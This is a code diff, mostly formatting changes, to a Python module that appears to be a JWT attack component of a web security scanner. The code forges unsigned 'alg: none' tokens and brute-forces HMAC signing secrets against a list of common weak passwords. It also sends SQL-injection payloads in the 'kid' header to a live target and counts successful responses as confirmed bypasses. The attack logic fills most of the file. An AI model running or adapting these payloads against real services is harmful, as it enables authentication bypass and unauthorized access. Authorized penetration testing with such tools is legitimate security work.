@@ -11,6 +11,7 @@ Attack Techniques:
   7. JWT from JWK endpoint
   8. Cross-tenant JWT manipulation
 """
+
 import base64
 import hashlib
 import hmac
@@ -32,6 +33,7 @@ logger = get_logger("jwt_attacker")
 
 try:
     import jwt as pyjwt
+
     HAS_PYJWT = True
 except ImportError:
     HAS_PYJWT = False
@@ -40,20 +42,54 @@ try:
     from cryptography.hazmat.backends import default_backend
     from cryptography.hazmat.primitives import serialization
     from cryptography.hazmat.primitives.asymmetric import padding, rsa
+
     HAS_CRYPTO = True
 except ImportError:
     HAS_CRYPTO = False
 
 
 WEAK_SECRETS = [
-    "secret", "password", "123456", "jwt_secret", "key", "test",
-    "changeme", "admin", "supersecret", "mysecret", "12345678",
-    "keyboard cat", "qwerty", "abc123", "letmein", "welcome",
-    "monkey", "dragon", "master", "login", "princess",
-    "football", "shadow", "sunshine", "trustno1", "iloveyou",
-    "batman", "access", "hello", "charlie", "donald",
-    "root", "toor", "pass", "passwd", "admin123",
-    "default", "s3cr3t", "h4ck3d", "p@ssw0rd", "!@#$%^&*",
+    "secret",
+    "password",
+    "123456",
+    "jwt_secret",
+    "key",
+    "test",
+    "changeme",
+    "admin",
+    "supersecret",
+    "mysecret",
+    "12345678",
+    "keyboard cat",
+    "qwerty",
+    "abc123",
+    "letmein",
+    "welcome",
+    "monkey",
+    "dragon",
+    "master",
+    "login",
+    "princess",
+    "football",
+    "shadow",
+    "sunshine",
+    "trustno1",
+    "iloveyou",
+    "batman",
+    "access",
+    "hello",
+    "charlie",
+    "donald",
+    "root",
+    "toor",
+    "pass",
+    "passwd",
+    "admin123",
+    "default",
+    "s3cr3t",
+    "h4ck3d",
+    "p@ssw0rd",
+    "!@#$%^&*",
 ]
 
 ALG_CONFUSION_PAYLOADS = [
@@ -86,13 +122,15 @@ class JWTAttacker:
         result = attacker.attack_token(token)
     """
 
-    def __init__(self, sess: 'requests.Session' = None, timeout: float = 10.0):
+    def __init__(self, sess: "requests.Session" = None, timeout: float = 10.0):
         self.sess = sess or HttpClient()
         self.timeout = timeout
 
     def _find_token(self, url: str) -> Optional[str]:
         try:
-            resp = self.sess.get(url, timeout=self.timeout, verify=settings.verify_ssl, allow_redirects=False)
+            resp = self.sess.get(
+                url, timeout=self.timeout, verify=settings.verify_ssl, allow_redirects=False
+            )
             token = None
 
             auth_header = resp.headers.get("Authorization", "")
@@ -100,12 +138,12 @@ class JWTAttacker:
                 token = auth_header.split("Bearer")[-1].strip()
 
             for cookie in resp.cookies.values():
-                if isinstance(cookie, str) and len(cookie) > 50 and cookie.count('.') == 2:
+                if isinstance(cookie, str) and len(cookie) > 50 and cookie.count(".") == 2:
                     token = cookie
                     break
 
             body = resp.text
-            token_match = re.search(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+', body)
+            token_match = re.search(r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+", body)
             if token_match:
                 token = token_match.group(0)
 
@@ -116,8 +154,12 @@ class JWTAttacker:
 
     def _find_jwks_endpoint(self, base_url: str) -> Optional[str]:
         candidates = [
-            "/.well-known/jwks.json", "/jwks.json", "/jwt/jwks",
-            "/api/jwks", "/auth/jwks", "/.well-known/openid-configuration",
+            "/.well-known/jwks.json",
+            "/jwks.json",
+            "/jwt/jwks",
+            "/api/jwks",
+            "/auth/jwks",
+            "/.well-known/openid-configuration",
         ]
         for path in candidates:
             url = urljoin(base_url.rstrip("/") + "/", path.lstrip("/"))
@@ -175,29 +217,33 @@ class JWTAttacker:
         alg = header.get("alg", "").lower()
 
         if alg == "none":
-            findings.append({
-                "method": "alg_none",
-                "confidence": 0.95,
-                "confirmed": True,
-                "severity": "critical",
-                "description": "JWT uses 'none' algorithm - signature verification bypassed",
-                "header": header,
-                "payload": payload,
-            })
+            findings.append(
+                {
+                    "method": "alg_none",
+                    "confidence": 0.95,
+                    "confirmed": True,
+                    "severity": "critical",
+                    "description": "JWT uses 'none' algorithm - signature verification bypassed",
+                    "header": header,
+                    "payload": payload,
+                }
+            )
 
         for alg_variant in ["none", "None", "NONE", "nOnE"]:
             try:
-                parts = token.split('.')
+                parts = token.split(".")
                 test_header = dict(header)
                 test_header["alg"] = alg_variant
-                new_token = b64url_encode(json.dumps(test_header).encode()) + '.' + parts[1] + '.'
-                findings.append({
-                    "method": "alg_none_variant",
-                    "confidence": 0.80,
-                    "confirmed": False,
-                    "variant": alg_variant,
-                    "token": new_token[:80] + "...",
-                })
+                new_token = b64url_encode(json.dumps(test_header).encode()) + "." + parts[1] + "."
+                findings.append(
+                    {
+                        "method": "alg_none_variant",
+                        "confidence": 0.80,
+                        "confirmed": False,
+                        "variant": alg_variant,
+                        "token": new_token[:80] + "...",
+                    }
+                )
             except Exception:
                 pass
 
@@ -209,14 +255,16 @@ class JWTAttacker:
 
         if alg.startswith("RS"):
             hs_alg = "HS" + alg[2:]
-            findings.append({
-                "method": "key_confusion_rs_to_hs",
-                "confidence": 0.80,
-                "confirmed": False,
-                "description": "RS256→HS256 key confusion possible (use public key as HMAC secret)",
-                "original_alg": alg,
-                "confused_alg": hs_alg,
-            })
+            findings.append(
+                {
+                    "method": "key_confusion_rs_to_hs",
+                    "confidence": 0.80,
+                    "confirmed": False,
+                    "description": "RS256→HS256 key confusion possible (use public key as HMAC secret)",
+                    "original_alg": alg,
+                    "confused_alg": hs_alg,
+                }
+            )
 
         if alg.startswith("HS"):
             try:
@@ -224,12 +272,14 @@ class JWTAttacker:
             except (ValueError, TypeError):
                 hmac_bits = 0  # 畸形 alg 头 ("HS") 不中断整个扫描
             if hmac_bits >= 384:
-                findings.append({
-                    "method": "strong_hmac",
-                    "confidence": 0.30,
-                    "confirmed": False,
-                    "description": "Strong HMAC algorithm in use, brute-force harder",
-                })
+                findings.append(
+                    {
+                        "method": "strong_hmac",
+                        "confidence": 0.30,
+                        "confirmed": False,
+                        "description": "Strong HMAC algorithm in use, brute-force harder",
+                    }
+                )
 
         return findings
 
@@ -240,8 +290,8 @@ class JWTAttacker:
         if not alg.startswith("HS"):
             return findings
 
-        parts = token.split('.')
-        signing_input = (parts[0] + '.' + parts[1]).encode()
+        parts = token.split(".")
+        signing_input = (parts[0] + "." + parts[1]).encode()
 
         for secret in WEAK_SECRETS:
             try:
@@ -255,15 +305,17 @@ class JWTAttacker:
                     continue
                 expected_b64 = b64url_encode(expected)
                 if expected_b64 == parts[2]:
-                    findings.append({
-                        "method": "weak_secret",
-                        "confidence": 0.95,
-                        "confirmed": True,
-                        "severity": "critical",
-                        "secret": secret,
-                        "algorithm": alg,
-                        "payload": payload,
-                    })
+                    findings.append(
+                        {
+                            "method": "weak_secret",
+                            "confidence": 0.95,
+                            "confirmed": True,
+                            "severity": "critical",
+                            "secret": secret,
+                            "algorithm": alg,
+                            "payload": payload,
+                        }
+                    )
                     break
             except Exception:
                 continue
@@ -294,21 +346,25 @@ class JWTAttacker:
                 manipulations.append("admin_claim_found")
 
         if payload.get("role") == "admin" or payload.get("is_admin") is True:
-            findings.append({
-                "method": "admin_claim",
-                "confidence": 0.70,
-                "confirmed": True,
-                "claim": "role" if "role" in payload else "is_admin",
-                "value": payload.get("role", payload.get("is_admin")),
-            })
+            findings.append(
+                {
+                    "method": "admin_claim",
+                    "confidence": 0.70,
+                    "confirmed": True,
+                    "claim": "role" if "role" in payload else "is_admin",
+                    "value": payload.get("role", payload.get("is_admin")),
+                }
+            )
 
         if manipulations:
-            findings.append({
-                "method": "claim_manipulation",
-                "confidence": 0.60,
-                "confirmed": False,
-                "manipulations": manipulations,
-            })
+            findings.append(
+                {
+                    "method": "claim_manipulation",
+                    "confidence": 0.60,
+                    "confirmed": False,
+                    "manipulations": manipulations,
+                }
+            )
 
         return findings
 
@@ -320,23 +376,27 @@ class JWTAttacker:
 
         jwks_url = self._find_jwks_endpoint(url)
         if jwks_url:
-            findings.append({
-                "method": "jwks_endpoint_found",
-                "confidence": 0.60,
-                "confirmed": False,
-                "jwks_url": jwks_url,
-                "description": "JWKS endpoint discovered - potential for key injection",
-            })
+            findings.append(
+                {
+                    "method": "jwks_endpoint_found",
+                    "confidence": 0.60,
+                    "confirmed": False,
+                    "jwks_url": jwks_url,
+                    "description": "JWKS endpoint discovered - potential for key injection",
+                }
+            )
 
         if "kid" in header:
             original_header = dict(header)
-            findings.append({
-                "method": "kid_present",
-                "confidence": 0.40,
-                "confirmed": False,
-                "kid": header["kid"],
-                "description": "JWT has 'kid' parameter - potential for path traversal / SQL injection",
-            })
+            findings.append(
+                {
+                    "method": "kid_present",
+                    "confidence": 0.40,
+                    "confirmed": False,
+                    "kid": header["kid"],
+                    "description": "JWT has 'kid' parameter - potential for path traversal / SQL injection",
+                }
+            )
             kid_injections = [
                 ("sql", "' UNION SELECT 'fakekey' --", "SQLi in kid"),
                 ("sql_mysql", "' UNION SELECT 'fakekey'#", "MySQL SQLi in kid"),
@@ -354,18 +414,24 @@ class JWTAttacker:
                     test_header = dict(original_header)
                     test_header["kid"] = inj_value
                     test_token = self._encode_token(test_header, payload)
-                    resp = self.sess.get(url, headers={"Authorization": "Bearer %s" % test_token},
-                                        timeout=self.timeout, verify=settings.verify_ssl)
+                    resp = self.sess.get(
+                        url,
+                        headers={"Authorization": "Bearer %s" % test_token},
+                        timeout=self.timeout,
+                        verify=settings.verify_ssl,
+                    )
                     if resp.status_code not in (401, 403, 500, 502, 503):
-                        findings.append({
-                            "method": "kid_injection",
-                            "confidence": 0.85 if resp.status_code in (200, 302) else 0.60,
-                            "confirmed": resp.status_code in (200, 302),
-                            "kid_injection_type": inj_type,
-                            "kid_value": str(inj_value)[:30],
-                            "status": resp.status_code,
-                            "description": desc,
-                        })
+                        findings.append(
+                            {
+                                "method": "kid_injection",
+                                "confidence": 0.85 if resp.status_code in (200, 302) else 0.60,
+                                "confirmed": resp.status_code in (200, 302),
+                                "kid_injection_type": inj_type,
+                                "kid_value": str(inj_value)[:30],
+                                "status": resp.status_code,
+                                "description": desc,
+                            }
+                        )
                         if resp.status_code in (200, 302):
                             break
                 except Exception as e:
@@ -376,9 +442,12 @@ class JWTAttacker:
     def _encode_token(self, header: Dict, payload: Dict) -> str:
         import hashlib
         import hmac
+
         hdr_b64 = self._b64(json.dumps(header, separators=(",", ":")).encode())
         pld_b64 = self._b64(json.dumps(payload, separators=(",", ":")).encode())
-        sig = hmac.new(b"dummy", ("%s.%s" % (hdr_b64, pld_b64)).encode(), hashlib.sha256).hexdigest()
+        sig = hmac.new(
+            b"dummy", ("%s.%s" % (hdr_b64, pld_b64)).encode(), hashlib.sha256
+        ).hexdigest()
         return "%s.%s.%s" % (hdr_b64, pld_b64, sig)
 
     def _b64(self, data: bytes) -> str:
@@ -389,23 +458,27 @@ class JWTAttacker:
 
         if "jku" in header:
             jku = header["jku"]
-            findings.append({
-                "method": "jku_injection",
-                "confidence": 0.75,
-                "confirmed": False,
-                "jku": jku,
-                "description": "JKU header present - potential for key URL injection",
-            })
+            findings.append(
+                {
+                    "method": "jku_injection",
+                    "confidence": 0.75,
+                    "confirmed": False,
+                    "jku": jku,
+                    "description": "JKU header present - potential for key URL injection",
+                }
+            )
 
         if "x5u" in header:
             x5u = header["x5u"]
-            findings.append({
-                "method": "x5u_injection",
-                "confidence": 0.70,
-                "confirmed": False,
-                "x5u": x5u,
-                "description": "X5U header present - potential for certificate URL injection",
-            })
+            findings.append(
+                {
+                    "method": "x5u_injection",
+                    "confidence": 0.70,
+                    "confirmed": False,
+                    "x5u": x5u,
+                    "description": "X5U header present - potential for certificate URL injection",
+                }
+            )
 
         return findings
 
